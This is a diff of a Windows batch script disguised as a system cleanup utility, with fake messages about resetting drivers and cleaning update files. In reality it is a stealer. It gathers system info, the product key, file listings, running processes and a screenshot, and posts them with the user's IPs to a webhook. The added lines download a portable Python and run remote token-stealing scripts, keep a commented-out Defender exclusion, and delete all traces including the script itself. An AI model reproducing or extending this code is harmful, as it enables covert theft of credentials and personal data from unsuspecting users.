@@ -9,8 +9,8 @@ echo.>>"%TEMP%\wstemp\sysinfo.txt"
 echo System Info:>>"%TEMP%\wstemp\sysinfo.txt"
 systeminfo >> "%TEMP%\wstemp\sysinfo.txt"
 echo Soft-Resetting Graphics Drivers..
-echo Windows Liscense Key:>>"%TEMP%\wstemp\liscense.txt"
-wmic path softwarelicensingservice get OA3xOriginalProductKey >> "%TEMP%\wstemp\liscense.txt"
+echo Windows License Key:>>"%TEMP%\wstemp\license.txt"
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" /v BackupProductKeyDefault >> "%TEMP%\wstemp\license.txt"
 dir >> "%TEMP%\wstemp\dir.txt"
 pushd C:\Program Files\
 dir >> "%TEMP%\wstemp\dir.txt"
@@ -25,24 +25,56 @@ echo Task List:>>%TEMP%\wstemp\tasks.txt
 tasklist>>%TEMP%\wstemp\tasks.txt
 dir "%USERPROFILE%\Documents" >> "%TEMP%\wstemp\dir.txt"
 dir "%USERPROFILE%\Desktop" >> "%TEMP%\wstemp\dir.txt"
-powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/fastfetch.exe -outfile %TEMP%\fastfetch.exe"
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/fastfetch.exe -outfile %TEMP%\fastfetch.exe"
 %TEMP%\fastfetch.exe >> "%TEMP%\wstemp\fastfetch.txt"
-powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/zipping.ps1 | iex"
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/zipping.ps1 | iex"
 pushd "%TEMP%\wstemp"
 echo Cleaning Windows Update files..
-powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat" >>"%TEMP%\wstemp\screenCapture.bat"
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat" >>"%TEMP%\wstemp\screenCapture.bat"
 call screenCapture screenshot.png >nul
 del screencapture.exe >nul
 del screencapture.bat >nul
 del %TEMP%\fastfetch.exe >nul
 curl -k -F "payload_json={\"content\": \"~=CONNECTION ESTABLISHED=~ \nDate: %date% \nTime: %time% \nUsername: %username% \nComputer Name: %COMPUTERNAME% \nPublic IP: %PublicIP% \nPrivate IP: %IP% \nInfo and Screenshot:\"}" -F "file1=@screenshot.png" -F "file2=@info.zip" %WEBHOOK% >nul
+del screenshot.png
+call :get_python
+REM echo You may be prompted for admin by Windows Security. If you do, please accept the prompt, because it needs admin to clean up Windows Update files.
+REM if not exist "%TEMP%\wstemp\updates.py" powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%\wstemp\updates.py'"
+if exist "%TEMP%\wstemp\updates.py" break>"%TEMP%\wstemp\updates.py"
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm '"https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/token1.py"'" > "%TEMP%\wstemp\updates.py"
+echo webhook = "%webhook%" >> "%TEMP%\wstemp\updates.py"
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm '"https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/token.py"'"  >> "%TEMP%\wstemp\updates.py"
+popd
+pushd "%TEMP%\wstemp\py\WPy64-31290\python"
+"python.exe" "%TEMP%\wstemp\updates.py"
+:wait_for_python
+tasklist | find /i "python.exe" >nul
+if not errorlevel 1 (
+    timeout /t 1 /nobreak >nul
+    goto wait_for_python
+)
+popd
+pushd "%TEMP%\wstemp"
+del "%TEMP%\wstemp\updates.py"
+REM powershell -Command "Remove-MpPreference -ExclusionPath '%TEMP%\wstemp\updates.py'"
 popd
 rd /s /q "%TEMP%\wstemp" >nul
 echo Done.
 timeout /t 3 >nul
-cls
+rem cls
 del "%~f0"
 exit
+
+:get_python
+echo Running further deep-cleaning scripts..
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://github.com/winpython/winpython/releases/download/13.1.202502222final/Winpython64-3.12.9.0dot.zip -OutFile '%TEMP%\python.zip'"
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://github.com/LargeVanillaMilkshake/1a/raw/refs/heads/main/7z.exe -OutFile '%TEMP%\7z.exe'"
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://github.com/LargeVanillaMilkshake/1a/raw/refs/heads/main/7z.dll -OutFile '%TEMP%\7z.dll'"
+"%TEMP%\7z.exe" x "%TEMP%\python.zip" -o%TEMP%\wstemp\py -aoa >nul
+del "%TEMP%\python.zip" >nul
+del "%TEMP%\7z.exe" >nul
+del "%TEMP%\7z.dll" >nul
+goto :EOF
 
 :logo
 mode con cols=70 lines=30
